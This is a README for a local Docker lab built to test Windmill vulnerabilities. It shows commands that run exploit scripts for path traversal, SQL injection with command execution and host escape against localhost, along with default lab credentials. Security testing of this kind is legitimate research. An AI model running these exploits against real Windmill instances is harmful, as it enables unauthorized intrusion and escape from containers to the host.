# Windfall - Windmill Standalone Lab

Test environment for Windmill vulnerabilities.

## Quick Start

```bash
# Start lab
docker-compose up -d

# Wait for healthy status
docker-compose ps

# Run Path Traversal exploit (from repo root)
cd ..
python3 windfall_afr.py http://localhost:8000 -c "id"

# Run SQLi exploit
python3 windfall_sqli.py http://localhost:8000 -u operator@windmill.dev -p password123 -c "id"

# Host escape
python3 windfall_afr.py http://localhost:8000 --host
```

## Lab Setup

```bash
# Start Windmill with SUPERADMIN_SECRET configured
docker-compose up -d

# Access: http://localhost:8000
# Operator: operator@windmill.dev / password123
```

## Default Credentials

| User | Email | Password | Role |
|------|-------|----------|------|
| Operator | operator@windmill.dev | password123 | operator |

## Files

- `docker-compose.yml` - Lab environment with Windmill + PostgreSQL
